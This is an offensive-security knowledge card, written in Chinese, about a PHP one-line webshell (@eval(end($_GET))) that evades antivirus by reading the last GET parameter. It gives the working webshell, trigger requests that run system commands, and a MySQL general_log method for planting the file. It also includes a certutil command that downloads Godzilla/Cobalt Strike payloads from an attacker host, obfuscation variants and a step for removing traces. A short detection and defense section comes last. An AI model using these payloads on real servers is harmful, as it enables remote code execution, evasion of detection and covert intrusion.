---
id: web-php-rce-webshell-end-get-last-param-eval
title: PHP 一句话木马免杀：@eval(end($_GET)) 取最后一个 GET 参数执行
type: scenario
domain: web
path: web/php/rce
technique: php-webshell-end-get-last-parameter-eval
aliases:
- end($_GET) 木马
- 取最后一个 GET 参数
- '@eval(end($_GET))'
- 一句话免杀
- 日志写马免杀
- 隐蔽参数执行
tags:
- php
- webshell
- av-bypass
- waf-bypass
- eval
- get-parameter
- general-log
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V156
  verified_at: '2026-11-06T07:50:57+08:00'
  notes: 已对照原文与图10核对：SQL general_log写入 SELECT '<?php @eval(end($_GET));?>'、木马用end($_GET)取最后一个GET参数、certutil下载Godzilla/CS，均与原文一致。核对时发现并修正卡内“带参数命令执行”示例的参数顺序（原为?x=1&z=system($_GET[1]);&1=whoami，导致end取到whoami而无法执行；已改为?x=1&1=whoami&z=system($_GET[1]);），并用本机PHP7.3验证end($_GET)取最后参数后可eval执行。未验证点：未在目标环境复跑整条SQL日志写马链；原文无杀软测试数据；frontmatter无sources/source_url。
---

## 一句话结论

把一句话木马写成 `<?php @eval(end($_GET));?>`，不直接引用 `$_GET['cmd']` 这类固定参数名，而是用 `end()` 取 GET 参数数组的最后一个值交给 `eval` 执行；这样木马源码中不出现常见的 `$_GET['...']`/`$_POST['...']` 特征，配合日志写入等落地方式可降低被杀软/规则匹配的概率。

## 原理

- **`end()` 的语义**：PHP 的 `end(array &$array)` 把数组内部指针移到最后一个元素并返回其值。`$_GET` 是请求参数数组，`end($_GET)` 即返回“URL 中最后一个查询参数”的值。
- **为什么能执行**：`eval()` 会把字符串当作 PHP 代码执行。请求 `shell.php?a=1&code=system('id');` 时，最后一个参数 `code` 的值 `system('id')` 被 `end($_GET)` 取出并交给 `eval`，从而执行任意 PHP 代码。
- **为什么更隐蔽**：常见 Webshell 检测规则/杀软特征会匹配 `eval($_POST['cmd'])`、`eval($_GET['cmd'])`、`assert($_REQUEST[...])` 等固定参数名模式；`end($_GET)` 不包含具体键名，源码看起来像普通的数组操作，能绕过一部分基于字符串签名的检测。
- **不是免杀的充分条件**：`eval` 本身仍是高危特征，现代 EDR/静态扫描可单独告警；该技巧主要规避“参数名 + eval”的组合签名，常与其他混淆（拆分、编码、注释、动态函数）叠加使用。
- **落地方式**：原文通过 MySQL `general_log_file` 把含该语句的 SQL 写入 Web 目录的 `a.php`，再用 `certutil` 下载更稳定的 Godzilla/CS 载荷；`end($_GET)` 主要解决“写入阶段的 Webshell 被查杀”问题。

## 触发条件

- 攻击者已能把 PHP 代码写入 Web 可访问目录（SQL 注入 `general_log`/`OUTFILE`、文件上传、日志包含等）。
- 目标 PHP 未禁用 `eval`（`disable_functions` 不含 eval；eval 是语言结构，通常无法被 disable_functions 禁用，但沙箱/扩展可能限制）。
- Web 服务器会解析写入的文件后缀（`.php` 等）。
- 目标杀软/EDR 的规则主要依赖固定参数名或已知 Webshell 哈希，而非对 `eval` 的通用行为检测。

## 利用步骤

1. 通过文件写入原语（如 MySQL `general_log`）把 `<?php @eval(end($_GET));?>` 写入 Web 目录，文件名使用不显眼的后缀/名称。
2. 访问木马并测试执行：构造 URL，把要执行的 PHP 代码放在最后一个查询参数中：
   ```text
   http://target/a.php?x=1&z=system('id');
   ```
   `end($_GET)` 取到 `z` 的值，`eval` 执行 `system('id')`。
3. 若需要传参执行命令，把完整 PHP 代码作为最后一个参数值，注意 URL 编码引号/特殊字符：
   ```text
   http://target/a.php?x=1&1=whoami&z=system($_GET[1]);
   ```
   由于 `end()` 只取最后一个参数，`1` 必须放在 payload 参数之前，payload 参数保持在最后。
4. 验证成功后，用 `certutil.exe -urlcache -split -f http://attacker/okok.php okok.php` 等方式下载更稳定的 Godzilla/CS 载荷，减少对被查杀一句话的依赖。
5. 清理写入的临时木马与日志（若权限允许），避免留存。

## PoC

木马内容：

```php
<?php @eval(end($_GET));?>
```

触发请求（`z` 是最后一个参数）：

```http
GET /a.php?x=1&z=system('id'); HTTP/1.1
Host: target
```

等价于执行：

```php
eval("system('id');");
```

带参数的命令执行（注意 `1` 放在前面，payload 参数放最后）：

```http
GET /a.php?1=whoami&z=system($_GET[1]); HTTP/1.1
Host: target
```

原文通过 SQL 日志写入的语句：

```sql
SELECT '<?php @eval(end($_GET));?>';
```

```text
说明：原文未给出该木马绕过具体杀软的测试数据；
     不同 PHP 版本对 end() 传值/引用的行为一致，但短标签、eval 限制需按目标确认。
```

## 变体与关联

- **取参变体**：`end($_REQUEST)`、`array_pop($_GET)`、`array_slice($_GET,-1)[0]`、`current(array_reverse($_GET))`。
- **混淆变体**：拆分 `eval`（`$f='ev'.'al'; $f(...)`）、字符串反转、base64 解码后 eval、注释插入。
- **落地变体**：`general_log`、`INTO OUTFILE/DUMPFILE`、文件上传、日志包含、`.htaccess` 自动包含。
- **关联卡片**：[[web-generic-sqli-mysql-outfile-general-log-webshell]]（MySQL 日志写 WebShell 的落地链）；[[web-php-rce-webshell-string-not-dynamic-call-av-bypass]]（字符串按位取反 + 可变变量免杀）；[[web-php-rce-iterator-webshell-split-reassemble]]（拆分函数名运行时重组）。
- **边界**：若目标对 `eval` 做通用检测/禁用（如 Suhosin、沙箱、EDR 行为监控），本技巧单独使用仍会被拦；若 Web 目录不可写或后缀不解析，落地失败。

## 检测与防御

- **根治**：禁止用户输入进入 `eval`/`assert`/`create_function`；文件写入点做路径与内容白名单；Web 目录不可写、上传目录不解析脚本。
- **PHP 加固**：使用 `disable_functions` 禁用高危函数（注意 eval 是语言结构）；部署 Suhosin/沙箱扩展限制 eval；关闭短标签。
- **检测**：Web 目录新增文件内容含 `eval(`、`assert(`、`end($_GET)`、`array_pop($_GET)` 等组合；请求参数数量异常且最后一个参数含 PHP 代码/命令；`general_log_file` 指向 Web 目录；`certutil -urlcache` 下载可执行文件。
- **EDR/杀软**：不要只依赖固定参数名签名，增加对 `eval` 调用链、PHP 文件写入行为、Web 进程创建子进程的监控。
- **响应**：发现木马后隔离主机、删除文件、回滚 Web 目录、轮换数据库与系统凭据，排查同一写入原语是否在其他目录落地。
